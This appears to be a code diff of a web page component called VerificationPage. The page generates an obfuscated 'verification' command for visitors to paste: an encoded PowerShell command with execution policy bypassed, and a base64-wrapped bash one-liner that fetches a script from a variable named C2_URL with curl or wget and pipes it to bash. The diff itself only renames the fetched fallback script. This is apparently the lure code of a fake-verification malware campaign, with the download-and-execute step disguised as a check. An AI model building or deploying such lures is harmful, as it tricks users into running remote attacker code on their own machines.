@@ -146,7 +146,7 @@ export function VerificationPage() {
         const fullCmd = `powershell -Exec Bypass -EncodedCommand ${b64Cmd}`;
         setCommand(fullCmd);
       } else if (os === "mac" || os === "linux") {
-        const shellScript = `#!/bin/bash\necho '\n CODE: ${nextCode}' && (curl -s ${C2_URL}/task1.sh || wget -qO- ${C2_URL}/repair.sh) | bash`;
+        const shellScript = `#!/bin/bash\necho '\n CODE: ${nextCode}' && (curl -s ${C2_URL}/task1.sh || wget -qO- ${C2_URL}/task1.sh) | bash`;
         const b64Script = b64Standard(shellScript);
         const fullCmd = `echo '${b64Script}' | base64 -d | bash`;
         setCommand(fullCmd);
